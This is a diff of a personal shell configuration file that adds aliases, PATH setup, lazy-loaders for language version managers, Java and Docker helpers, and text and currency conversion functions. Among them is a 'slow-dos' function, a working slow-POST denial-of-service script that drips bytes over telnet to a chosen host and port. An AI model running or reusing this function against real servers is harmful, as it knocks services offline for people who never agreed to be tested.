@@ -1,6 +1,11 @@
-REPOSITORY_DIR="$HOME/reps"
 USER_BIN="$HOME/bin"
 SKEL_PROJECT_DIR="$HOME/.zsh/project-skel/"
+
+export HISTSIZE=1000000
+export HISTFILESIZE=1000000
+export SAVEHIST=1000000
+
+# __GRE_REPOSITORY_DIR environment variable is defined on .profile.
 export PS1="\W \$ "
 
 ###################################
@@ -12,9 +17,13 @@ if [[ $unamestr == 'Darwin' ]]; then
   VIMPATH="/Applications/MacVim.app/Contents/MacOS"
   alias ls='ls -G' #BSD version ls
   alias updatedb='sudo /usr/libexec/locate.updatedb'
-  alias egison-euler="egison -l $REPOSITORY_DIR/project-euler/lib/math/project-euler.egi -l $REPOSITORY_DIR/prime-numbers/lib/math/prime-numbers.egi"
+  alias egison-euler="egison -l $__GRE_REPOSITORY_DIR/project-euler/lib/math/project-euler.egi -l $__GRE_REPOSITORY_DIR/prime-numbers/lib/math/prime-numbers.egi"
   alias p='pbcopy'
-  alias jshell='/Library/Java/JavaVirtualMachines/jdk-9.jdk/Contents/Home/bin/jshell'
+  alias factor='gfactor'
+  alias shuf='gshuf'
+  alias chrome="/Applications/Google\ Chrome.app/Contents/MacOS/Google\ Chrome"
+  alias vscode="/Applications/Visual\ Studio\ Code.app/Contents/Resources/app/bin/code"
+  export ECLIPSE_HOME="$HOME/eclipse"
 
   cdf () {
       target=`osascript -e 'tell application "Finder" to if (count of Finder windows) > 0 then get POSIX path of (target of front Finder window as text)'`
@@ -55,9 +64,8 @@ if [[ $unamestr == 'Darwin' ]]; then
     done
   }
 
-  # Maven for old java
+  # Maven for specific settings
   gmvn(){
-    JAVA_HOME="/System/Library/Java/JavaVirtualMachines/1.6.0.jdk/Contents/Home"
     mvn --settings $HOME/.m2/g_settings.xml "$@"
   }
 
@@ -77,6 +85,16 @@ elif [[ $unamestr == 'CYGWIN' ]]; then
   }
 elif [[ $unamestr == 'Linux' ]]; then
   alias ls='ls --color=auto' #GNU version ls
+  export ECLIPSE_HOME="$HOME/eclipse"
+fi
+
+#--------------------
+# Editor
+#--------------------
+# Set default editor as vim not vi. This is used to edit commit message of git.
+export EDITOR=vi
+if (type vim &> /dev/null) ;then
+  export EDITOR=vim
 fi
 
 #--------------------
@@ -85,8 +103,6 @@ fi
 alias l='ls -CF'
 alias ll='ls -al'
 alias grep='grep --color=auto'
-alias shuf='gshuf'
-alias factor='gfactor'
 alias ..="cd .."
 alias ..2="cd ../.."
 alias ..3="cd ../../.."
@@ -116,7 +132,7 @@ alias ssld-csr='openssl req -text -noout -in'
 # usage $ ssl-cacert-dump filename
 alias ssld-cacert='keytool -v -list -storepass changeit -keystore'
 alias fuck='eval $(thefuck $(fc -ln -1 | tail -n 1)); fc -R'
-alias pt='pt -i'
+# alias pt='pt -i'
 
 # Ref: http://qiita.com/greymd/items/ad18aa44d4159067a627
 alias pict-format="column -s$'\t' -t | tee >(sed -n '1,1p') | sed '1,1d' | sort"
@@ -125,9 +141,153 @@ alias 蒸着="sudo -s"
 alias octave='octave --no-gui'
 
 #--------------------
+# Update PATH variable
+#--------------------
+__add_path () {
+  if [ -e "$1" ]; then
+    export PATH="$1:${PATH}"
+  fi
+}
+
+_target_path="$HOME/.config"
+if [ -e "$_target_path" ]; then
+  # XDG Base Directory for nvim and so on
+  export XDG_CONFIG_HOME="$HOME/.config"
+fi
+
+#--------------------
+# Import various commands
+#--------------------
+__add_path "$HOME/bin"
+__add_path "$HOME/.config/tmuxvm/bin" # Activate tmuxvm
+__add_path "$HOME/.embulk/bin"
+__add_path "$HOME/.cabal/bin"
+__add_path "$HOME/.composer/vendor/bin"
+__add_path "$HOME/.egison/bin"
+__add_path "/usr/games" # For Ubuntu
+__add_path "/usr/local/sbin"
+__add_path "/usr/local/opt/icu4c/bin"
+__add_path "/usr/local/opt/icu4c/sbin"
+
+#--------------------
+# Go
+#--------------------
+_target_path="$HOME/.go"
+if [ -e "$_target_path" ]; then
+  export GOPATH="$_target_path"
+  export GOBIN="$_target_path/bin"
+  export PATH=$GOPATH/bin:$PATH
+fi
+
+#--------------------
+# Python
+#--------------------
+export PYENV_ROOT="$HOME/.pyenv"
+__add_path "$PYENV_ROOT/bin"
+
+# pyenv lazy-load
+pyenv () {
+  unset -f pyenv
+  eval "$(pyenv init -)"
+  pyenv "$@"
+}
+
+#--------------------
+# PHP
+#--------------------
+[[ -e ~/.phpbrew/bashrc ]] && source ~/.phpbrew/bashrc
+
+#--------------------
+# Ruby
+#--------------------
+__add_path "$HOME/.rbenv/bin"
+__add_path "$HOME/.rbenv/shims"
+
+# lazy load for rbenv
+rbenv () {
+  unset -f rbenv
+  eval "$(rbenv init - $(basename $SHELL))"
+  rbenv "$@"
+}
+
+#--------------------
+# Node.js
+#--------------------
+_node_version="$HOME/.nvm/alias/default"
+if [ -s "$_node_version" ];then
+  __add_path "$HOME/.nvm/versions/node/$(cat $_node_version)/bin"
+fi
+
+# nvm command lasy-load
+nvm() {
+    unset -f nvm
+    export NVM_DIR="$HOME/.nvm"
+    [ -s "$NVM_DIR/nvm.sh" ] && . "$NVM_DIR/nvm.sh"  # This loads nvm
+    [ -s "$NVM_DIR/bash_completion" ] && [ -n "$BASH_VERSION" ] && . "$NVM_DIR/bash_completion"
+    nvm "$@"
+}
+
+#--------------------
 # Java
 #--------------------
-alias jrepl="java -jar $USER_BIN/bin/javarepl-dev.build.jar"
+alias jrepl="java -jar $HOME/bin/javarepl-dev.build.jar"
+
+export JAVA_HOME="$HOME/.sdkman/candidates/java/current/"
+__add_path "$HOME/.sdkman/candidates/java/current/bin"
+__add_path "$HOME/.sdkman/candidates/maven/current/bin"
+__add_path "$HOME/.sdkman/candidates/ant/current/bin"
+__add_path "$HOME/.sdkman/candidates/gradle/current/bin"
+
+jex () {
+  javac $1 && java ${1%.java}
+}
+
+_jshell () {
+  "$HOME/.sdkman/candidates/java/9.0.0-zulu/bin//jshell" "$@"
+}
+
+jshell () {
+  local _opts=
+  local _tmpfile="${TMPDIR:-/tmp}/imports"
+  if [[ -s "${PWD}/.classpath" ]]; then
+    # Load jar files.
+    _opts="$_opts --class-path $(cat "${PWD}/.classpath" | grep -Po 'classpathentry sourcepath.* path="\K[^"]*(?=")' | sort | uniq | tr '\n' ':' | sed 's/:$//')"
+  fi
+
+# Load all the import statement under src directory.
+# Behavior is unstable and it is temporarily disabled.
+  if [[ -e "${PWD}/src" ]]; then
+    find ${PWD}/src -type f | grep 'java$' | xargs cat | grep '^import .*;' | sort | uniq > "$_tmpfile"
+    _opts="$_opts --startup $_tmpfile"
+  fi
+
+  if [[ -n "$_opts" ]];then
+    _jshell $_opts "$@"
+  else
+    _jshell "$@"
+  fi
+}
+
+jarls () {
+  if [[ -s "${PWD}/.classpath" ]]; then
+    cat "${PWD}/.classpath" | grep -Po 'classpathentry sourcepath.* path="\K[^"]*(?=")' | sort | uniq
+  else
+    echo ".class file does not exist." >&2
+  fi
+}
+
+# lazy load for sdkman
+SDKMAN_DIR="$HOME/.sdkman"
+sdk () {
+  unset -f sdk
+  _target_path="$SDKMAN_DIR/bin/sdkman-init.sh"
+  if [ -s "$_target_path" ];then
+    source "$_target_path"
+    sdk "$@"
+  else
+    echo 'sdkman is not found.' 1>&2
+  fi
+}
 
 mvn-instant() {
   local _name=${1:-$(faker-cli --hacker noun | tr -d '[ "]')}
@@ -176,6 +336,10 @@ task execute(type:JavaExec) {
     classpath = sourceSets.main.runtimeClasspath
 }
 
+test {
+    testLogging.showStandardStreams = true
+}
+
 jar {
   doFirst {
     from { configurations.compile.collect { it.isDirectory() ? it : zipTree(it) } }
@@ -213,10 +377,43 @@ gradle-springboot () {
     # RunTest: gradle test
 }
 
+gradle-test () {
+  local _case="${1}"
+  if [ -z "$_case" ]; then
+    gradle test --tests "*"
+  else
+    local _args=($(echo "$@" | xargs -n 1 | sed 's/^/--tests */'))
+    gradle test "${_args[@]}"
+  fi
+}
+
+javadoc-src () {
+  javadoc -d "$(pwd)/html" -sourcepath "$(pwd)/src/main/java/" -subpackages .
+}
+
+#--------------------
+# Eclipse
+#--------------------
+if [ -e $ECLIPSE_HOME/eclimd ]; then
+  alias eclim-screen='if ( type Xvfb &> /dev/null ) && ! ( ps alx | grep -wq "[X]vfb" ) ;then nohup Xvfb :1 -screen 0 1024x768x24 &> /dev/null & fi'
+fi
+
+if (type fasd &> /dev/null) ;then
+  eval "$(fasd --init auto)"
+fi
+
+
 #--------------------
 # Docker
 #--------------------
-alias dcure="docker run -e LANG=ja_JP.UTF-8 -it --rm cureutils/ruby2.2.0 cure"
+alias docker-cure="docker run -e LANG=ja_JP.UTF-8 -it --rm cureutils/ruby2.2.0 cure"
+alias dockviz="docker run -it --rm -v /var/run/docker.sock:/var/run/docker.sock nate/dockviz"
+
+# For Bash on Windows
+#  if (grep -q Microsoft /proc/version 2> /dev/null ) ;then
+#    # alias docker="docker -H tcp://localhost:2375 --tlsverify --tlscacert /mnt/c/Users/$USER/.docker/machine/certs/ca.pem  --tlscert /mnt/c/Users/$USER/.docker/machine/certs/cert.pem --tlskey /mnt/c/Users/$USER/.docker/machine/certs/key.pem"
+#    alias docker="docker -H tcp://localhost:2375"
+#  fi
 
 docker-clean () {
   docker ps -a -q | xargs docker rm
@@ -235,11 +432,27 @@ docker-ex () {
 }
 
 docker-dev () {
-  if [[ $1 =~ ^-v$ ]]; then
-    docker run -v $(pwd):/work -it greymd/dev /bin/zsh
-  else
-    docker run -it greymd/dev /bin/zsh
+  local _cmd='tmux -2'
+  local _opts="-it greymd/dev"
+  if [[ "$1" =~ v ]]; then
+    # Mount current volume
+    _opts="-v ${PWD}:/work ${_opts}"
   fi
+  if [[ "$1" =~ j ]]; then
+    # Java mode
+    # _cmd='nohup Xvfb :1 -screen 0 1024x768x24 &> /dev/null & /home/docker/eclipse/eclimd -b &> /dev/null && tmux -2'
+    _cmd='nohup Xvfb :1 -screen 0 1024x768x24 &> /dev/null & tmux -2'
+  fi
+  if [[ "$1" =~ m ]]; then
+    # Import Maven settings
+    _opts="-v $HOME/.m2:/home/docker/.m2 ${_opts}"
+  fi
+  if [[ "$1" =~ s ]]; then
+    # Import SSH settings
+    _opts="-v $HOME/.ssh:/home/docker/.ssh ${_opts}"
+  fi
+  echo "command: docker run $_opts /bin/zsh -c \"$_cmd\""
+  docker run $_opts /bin/zsh -c "$_cmd"
 }
 
 docker-ubuntu () {
@@ -341,7 +554,7 @@ pt-gvim(){
 }
 
 # Open multiple files with vim from pt result.
-pt-vx(){
+pt-xpanes(){
   type xpanes &> /dev/null
   if [ $? -ne 0 ]; then
     echo "xpanes is required" >&2
@@ -418,13 +631,88 @@ egi-conv () {
   xargs -n $1
 }
 
+sed-conv () {
+  local _NF=$1
+  sed -n 'H;'$_NF',${g;s/\n/ /g;p};'$(($_NF-1))',${x;s/[^\n]*\n//;h}'
+}
+
 urlenc() {
   od -An -tx1 | awk 'NF{OFS="%";$1=$1;print "%"$0}' | tr '[:lower:]' '[:upper:]'
 }
 
+# Numeric character refernce to string
+# echo '&#x78BA;&#x8A8D;' | ncr2str
+ncrhex2str () {
+  perl -MHTML::Entities -pe 'decode_entities($_);' 2>/dev/null
+}
+
+str2ncrhex () {
+  iconv -f UTF-8 -t UTF-16BE | od -tx1 -An | tr -dc 'a-zA-Z0-9' | fold -w 4 | sed 's/^/\&#x/;s/$/;/' | tr -d \\n
+}
+
+
 # String to Unicode Escapse Sequence
 str2ues () {
-    nkf -w16B0 | od -tx1 -An | tr -dc '[:alnum:]' | fold -w 4 | sed 's/^/\\u/g' | tr -d '\n' | awk 1
+  nkf -w16B0 | od -tx1 -An | tr -dc '[:alnum:]' | fold -w 4 | sed 's/^/\\u/g' | tr -d '\n' | awk 1
+  # nkf -w16B0
+}
+
+# Example
+# printf "%s" '\u3046\u3093\u3053\u000a' | ues2str
+# But just echo command supports UES. It might not be the necessary feature.
+ues2str () {
+  sed -r "s/\\\\u(....)/\&#x\1;/g" | ncrhex2str
+}
+
+# Ref: http://qiita.com/ryo0301/items/7c7b3571d71b934af3f8
+camel2snake () {
+  sed 's/\([a-z0-9]\)\([A-Z]\)/\1_\L\2/g'
+}
+
+camel2pascal () {
+  sed -r 's/(^|_)(.)/\U\2\E/g'
+}
+
+snake2camel () {
+  sed -r 's/_(.)/\U\1\E/g'
+}
+
+snake2pascal () {
+  sed -r 's/(^|_)(.)/\U\2\E/g'
+}
+
+pascal2camel () {
+  sed -r -e 's/^([A-Z])/\L\1\E/'
+}
+
+pascal2snake () {
+  sed -r -e 's/^([A-Z])/\L\1\E/' -e 's/([A-Z])/_\L\1\E/g'
+}
+
+is_camel () {
+  grep -E '^[a-z]+([A-Z][a-z0-9]+)+'
+}
+
+is_snake () {
+  grep -E '^[a-z]+(_[a-z0-9]+)+'
+}
+
+is_pascal () {
+  grep -E '^([A-Z][a-z0-9]+)+'
+}
+
+# Generate regular expression for camel, snake and pascal cases.
+# $ csp_cases "hogeHoge"
+# (hoge_hoge|hogeHoge|HogeHoge)
+csp_cases () {
+  local _pat="$1"
+  # convert all the petterns to snake case in any case.
+  _pat=$(echo "$_pat" | camel2snake)
+  _pat=$(echo "$_pat" | pascal2snake)
+  local _snake="$_pat"
+  local _camel="$(echo "$_pat" | snake2camel)"
+  local _pascal="$(echo "$_pat" | snake2pascal)"
+  echo "($_snake|$_camel|$_pascal)"
 }
 
 usedportof()
@@ -433,7 +721,16 @@ usedportof()
 }
 
 holidays() {
-  curl -Lso- goo.gl/Ynbsm9
+  local _cmd="$1" ;shift
+  case "$_cmd" in
+    until)
+      local _until_date="$1"
+      curl -Lso- goo.gl/Ynbsm9 | awk 1 | awk '/'"$(date +%F)"'/,/'"${_until_date}"'/'
+      ;;
+    *)
+      curl -Lso- goo.gl/Ynbsm9 | awk 1
+      ;;
+  esac
 }
 
 today() {
@@ -461,11 +758,17 @@ transfer() {
 }
 
 primes() {
-    local _factor="gfactor"
-    if ( type factor &> /dev/nul ); then
-        _factor="factor"
-    fi
+  local _factor=""
+  if ( type gfactor &> /dev/null ); then
+      _factor="gfactor"
+  else ( type factor &> /dev/null )
+      _factor="factor"
+  fi
   yes | awk '$0=NR+1' | $_factor | awk '$0*=!$3'
+}
+
+fizzbuzz() {
+  yes | awk '{print NR}' | sed '0~3s/.*/Fizz/;0~5s/$/Buzz/' | sed 's/[0-9]*B/B/'
 }
 
 answer_is () {
@@ -595,13 +898,6 @@ pokemons () {
     w3m -dump 'http://wiki.xn--rckteqa2e.com/wiki/%E3%83%9D%E3%82%B1%E3%83%A2%E3%83%B3%E3%81%AE%E5%A4%96%E5%9B%BD%E8%AA%9E%E5%90%8D%E4%B8%80%E8%A6%A7' | sed -n '/001  フシギダネ/,/151 ミュウ/p' | perl -anle '/^\d{3}/ and scalar(@F)==6 and print'
 }
 
-adjust_md_refs () {
-    local _tmp_file="/tmp/$$.adjust_md_refs"
-    cat "$1" | grep -oP '\[\^[^\[]*?\](?!:)' | while read s; do echo "$s" | awk '{print "s/"$1"/[^'$(cat /dev/urandom| LANG=C tr -dc 'A-Za-z0-9' | fold -w 10 | head -n 1)']/g"}' ;done | perl -pe 's/[\[\]]/\\$&/g' | sed -f - "$1" > "$_tmp_file"
-    cat "$_tmp_file" | grep -oP '\[\^[^\[]*?\](?!:)' | awk '{print "s/"$1"/[^"NR"]/g"}' | perl -pe 's/[\[\]]/\\$&/g' | sed -f - "$_tmp_file"
-    rm "$_tmp_file"
-}
-
 # 2 -> 10
 bin2dec() {
     BC_LINE_LENGTH=0 cat | sed 's/^/obase=10;ibase=2;/' | bc | while read i;do echo $i ;done
@@ -625,12 +921,12 @@ dec2hex () {
 
 # 16 -> 2
 hex2bin () {
-    BC_LINE_LENGTH=0 cat | sed 's/^/obase=2;ibase=16;/' | bc | while read i;do echo $i ;done
+    BC_LINE_LENGTH=0 cat | tr '[:lower:]' '[:upper:]' | sed 's/^/obase=2;ibase=16;/' | bc | while read i;do echo $i ;done
 }
 
 # 16 -> 10
 hex2dec() {
-    BC_LINE_LENGTH=0 cat | sed 's/^/obase=10;ibase=16;/' | bc | while read i;do echo $i ;done
+    BC_LINE_LENGTH=0 cat | tr '[:lower:]' '[:upper:]' | sed 's/^/obase=10;ibase=16;/' | bc | while read i;do echo $i ;done
 }
 
 sslcert-gen() {
@@ -675,11 +971,167 @@ train-kanto () {
     xargs -n 2
 }
 
-# --------------------
-# Bash completion
-# --------------------
-if [ -f "${REPOSITORY_DIR}/scop/bash-completion/bash_completion" ] && [ -n "$BASH_VERSION" ]; then
-  . ${REPOSITORY_DIR}/scop/bash-completion/bash_completion
-fi
+ggrks () { echo $@ | tr \  + | awk '{print "http://www.google.co.jp/search?hl=ja&source=hp&q="$0}' | xargs open;};
+
+slow-dos () {
+  local _fqdn="$1"
+  local _domain_port=$(awk -F'/' '{print $1}' <<<"$_fqdn")
+  local _domain=$(awk -F':' '{print $1}' <<<"$_domain_port")
+  local _port=$(awk -F':' '{print $2}' <<<"$_domain_port" | grep -oE '[0-9]*')
+  local _request_path=$(grep -oE '/.*$' <<<"$_fqdn")
+  local _clength=${2:-10}
+  _request_path=${_request_path:-/}
+  _port=${_port:-80}
+  echo "_fqdn $_fqdn"
+  echo "_domain $_domain"
+  echo "_request_path ${_request_path}"
+  echo "_port ${_port}"
+  (sleep 1; echo -ne "POST $_request_path HTTP/1.1\nHost: $_domain\nContent-Length: $_clength\n\n"; yes 'printf a; sleep 1;' | sh ) | telnet "$_domain" "$_port"
+}
+
+nc-200 () {
+  ( echo "HTTP/1.1 200 Ok"; echo; printf "$1" ) | nc -l 8080
+}
+
+hub-clone () {
+  local _user="${1%/*}"
+  local _repo="${1##*/}"
+  local _repo_path="$HOME/reps"
+  git clone "git@github.com:$1.git" "$_repo_path/$_user/$_repo"
+  cd "$_repo_path/$_user/$_repo"
+}
+
+fnd () {
+  find "$PWD" | grep "${1-}"
+}
+
+mail-sweeper () {
+  local _mail_dir="$HOME/Mails/new"
+  local _filter="$1" ;shift
+  local _opt="${1-}" ;shift
+  local _target_dir="$PWD"
+
+  if [ -z "$_filter" ]; then
+    echo "Error: filter '$_filter' is empty." >&2
+    return 1
+  fi
+
+  if [[ "$_opt"  =~ ^--all$ ]];then
+    getmail -v --all
+  else
+    getmail -v -n
+  fi
+
+  (
+    cd "$_mail_dir"
+    rename "s/\.[^\.]+$/.eml/" *
+    find . -type f \
+      | grep eml \
+      | while read f;
+        do
+          printf "mv '$f' "
+          echo '"'$_mail_dir/$(cat "$f" | nkf -w | perl -nle '/^Subject: \K.*/ and print $&')_$(basename $f)'"'
+        done | tee | sh
+    grep "$_filter" * | awk -F: '{print $1}' | sort | uniq | while read f;do mv "$f" "$_target_dir";done
+  )
+}
+
+btc2jpy () {
+  local _unit=${1:-1}
+  local _rate
+  _rate="$(curl https://api.bitflyer.jp/v1/getboard -G -d 'product_code=BTC_JPY' 2>/dev/null | jq '.mid_price')"
+  echo "$_rate * $_unit" | bc -l
+}
+
+ytn2jpy () {
+  local _unit=${1:-1}
+  local _rate
+  _rate=$(curl -so- 'https://www.coingecko.com/ja/%E7%9B%B8%E5%A0%B4%E3%83%81%E3%83%A3%E3%83%BC%E3%83%88/yenten/jpy' | sed -nr 's|今日のYENTEN の価格は.*<span>([0-9\.]+).?</span>.*$|\1|p')
+  echo "$_rate * $_unit" | bc -l
+}
+
+aud2jpy () {
+  local _unit=${1:-1}
+  local _rate
+  _rate=$(something-jpy "aud")
+  echo "$_rate * $_unit" | bc -l
+}
+
+eur2jpy () {
+  local _unit=${1:-1}
+  local _rate
+  _rate=$(something-jpy "eur")
+  echo "$_rate * $_unit" | bc -l
+}
+
+usd2jpy () {
+  local _unit=${1:-1}
+  local _rate
+  _rate=$(something-jpy "usd")
+  echo "$_rate * $_unit" | bc -l
+}
+
+something-jpy () {
+  local _cur="$1"
+  curl -H 'User-Agent: Mozilla/5.0' https://jp.investing.com/currencies/${_cur}-jpy 2>/dev/null \
+    | xmllint --format --html --xpath '//*[@id="last_last"]/text()' - 2>/dev/null
+}
+
+#
+# Input:
+# 2017-11-30 ScheduleA
+# 2017-12-01 ScheduleA
+# 2017-12-04 ScheduleA
+# 2017-12-05 ScheduleA
+# 2017-12-06 ScheduleA
+# 2017-12-07 ScheduleA
+# 2017-12-08 ScheduleB
+# 2017-12-11 ScheduleC
+# 2017-12-12 ScheduleC
+#
+# Output:
+# 2017-11-30 - 12-07 ScheduleA
+# 2017-12-08 ScheduleB
+# 2017-12-11 - 12-12 ScheduleC
+schedule_shrink () {
+  awk '{print $1,$NF}' \
+    | awk '{a[$NF]=a[$NF]" "$1} END{for(k in a){print a[k],k}}' \
+    | sort -k1,1n \
+    | awk 'NF>2{gsub(/^....-/,"",$(NF-1));print $1" - "$(NF-1),$NF} NF==2{print $1,$2}'
+}
+
+
+# -----------------------
+# Markdown Utils
+# -----------------------
+
+md.tbl () {
+  pandoc -f gfm -t gfm
+}
+
+md.tblsum () {
+  local _from="$1" ;shift
+  local _to="$1" ;shift
+  awk '
+  {
+    for (i=from+offset; i<=to+offset; i++){
+      s[i]=s[i]+$i
+    };print
+  }
+  END{
+    printf "%s",OFS"sum"
+    for (i=from+offset; i<=to+offset; i++){
+      printf OFS""s[i]
+    }
+    print OFS
+  }' {FS,OFS,IFS}='|' offset=1 from="${_from}" to="${_to}" | pandoc -f gfm -t gfm
+}
+
+md.adjust_refs () {
+    local _tmp_file="/tmp/$$.adjust_md_refs"
+    cat "$1" | grep -oP '\[\^[^\[]*?\](?!:)' | while read s; do echo "$s" | awk '{print "s/"$1"/[^'$(cat /dev/urandom| LANG=C tr -dc 'A-Za-z0-9' | fold -w 10 | head -n 1)']/g"}' ;done | perl -pe 's/[\[\]]/\\$&/g' | sed -f - "$1" > "$_tmp_file"
+    cat "$_tmp_file" | grep -oP '\[\^[^\[]*?\](?!:)' | awk '{print "s/"$1"/[^"NR"]/g"}' | perl -pe 's/[\[\]]/\\$&/g' | sed -f - "$_tmp_file"
+    rm "$_tmp_file"
+}
 
 
